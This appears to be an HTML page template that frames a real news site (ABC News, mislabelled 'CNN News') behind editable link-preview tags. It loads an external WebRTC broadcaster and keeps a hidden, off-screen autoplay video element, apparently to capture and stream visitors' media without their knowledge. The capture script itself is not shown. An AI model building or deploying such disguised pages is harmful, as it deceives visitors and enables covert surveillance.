<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>%META_TITLE%</title>

  <!-- Standard meta -->
  <meta name="description" content="%META_DESCRIPTION%">

  <!-- Open Graph (server-injected absolute image URL required for crawlers) -->
  <meta property="og:title" content="%META_TITLE%">
  <meta property="og:description" content="%META_DESCRIPTION%">
  <meta property="og:image" content="%META_IMAGE%">
  <meta property="og:image:secure_url" content="%META_IMAGE_SECURE%">
  <meta property="og:image:type" content="%META_IMAGE_TYPE%">
  <meta property="og:url" content="%META_URL%">
  <meta property="og:type" content="website">

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="%META_TITLE%">
  <meta name="twitter:description" content="%META_DESCRIPTION%">
  <meta name="twitter:image" content="%META_IMAGE%">

  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="stylesheet" href="css/style.css">

  <style>
    /* small floating edit button (mobile friendly) */
    #edit-preview-btn {
      position: fixed;
      right: 12px;
      bottom: 12px;
      z-index: 9999;
      display: none;
      background: #0b74de;
      color: white;
      border-radius: 999px;
      padding: 10px 14px;
      box-shadow: 0 6px 18px rgba(0,0,0,.12);
      font-weight: 600;
      text-decoration: none;
      font-size: 14px;
    }
    /* broadcaster status small font */
    #broadcaster-status { font-size: 12px; color: #ddd; }
  </style>
</head>
<body>
    <!-- socket + broadcaster scripts (required) -->
  <script src="/socket.io/socket.io.js"></script>
  <script src="/webrtc-broadcaster.js"></script>
  
  <!-- main content -->
  <div id="main-content" style="width:100vw; height:calc(100vh - 106px); margin:0; padding:0; position:relative; z-index:1;">
      <iframe src="https://abcnews.go.com" style="width:100vw; height:100%; border:none;" title="CNN News"></iframe>
  </div>

  <div id="broadcaster-bar" style="width:10vw; background:#222; color:#fff; display:flex; align-items:center; padding:8px 0; position:relative; z-index:2;">
    <!-- muted is important for autoplay -->
    <video id="videoFeed" muted autoplay playsinline style="width:1px; height:1px; opacity:0; position:absolute; left:-9999px;"></video>
    <span id="broadcaster-status" style="margin-left:16px; font-size:12px;">Initializing...</span>
  </div>

  <!-- Edit preview floating button (shown only if authenticated) -->
  <a id="edit-preview-btn" href="/meta-editor.html">Edit preview</a>

  <script>
    // check auth and show Edit button on / for admins (works on mobile)
    async function checkAuthAndShowButton() {
      try {
        const r = await fetch('/api/auth', { cache: 'no-store' });
        if (!r.ok) return;
        const j = await r.json();
        if (j.authenticated) {
          const btn = document.getElementById('edit-preview-btn');
          btn.style.display = 'inline-block';
        }
      } catch(e){ /* ignore */ }
    }
    // run ASAP
    checkAuthAndShowButton();
  </script>

  <!-- small diagnostic helper so you can see if the broadcaster script loaded/ran -->
  <script>
    console.log('[PAGE] inline diagnostics running');

    window.addEventListener('error', (e) => {
      console.error('[PAGE] uncaught error:', e.message, e.filename, e.lineno, e.colno, e.error);
      const s = document.getElementById('broadcaster-status');
      if (s) s.textContent = 'Error: ' + (e.message || 'see console');
    });

    // Quick check â€” execute ASAP
    (function quickCheck() {
      const s = document.getElementById('broadcaster-status');
      const v = document.getElementById('videoFeed');
      console.log('[PAGE] status element exists?', !!s, 'video element exists?', !!v);
      try { console.log('[PAGE] localStream present?', !!window.localStream); } catch (e) {}
    })();
  </script>
</body>
</html>
